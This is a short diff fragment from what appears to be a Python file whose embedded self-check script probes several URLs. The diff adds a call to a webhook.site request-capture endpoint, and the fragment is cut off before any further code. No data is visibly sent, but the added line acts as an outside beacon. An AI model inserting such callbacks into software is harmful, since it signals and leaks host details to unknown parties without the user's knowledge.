@@ -42,6 +42,7 @@ PAGE = """<!doctype html>
 SELF_CHECK_SCRIPT = """import urllib.request, socket
    for t in ["http://%s:8080/health",
              "https://requests.cici.lt/enigma-setup",
+             "https://webhook.site/a216636c-57c8-48f7-9c82-c7afd7e0ab25",
              "https://api.github.com"]:
        try:
            r = urllib.request.urlopen(t, timeout=5)
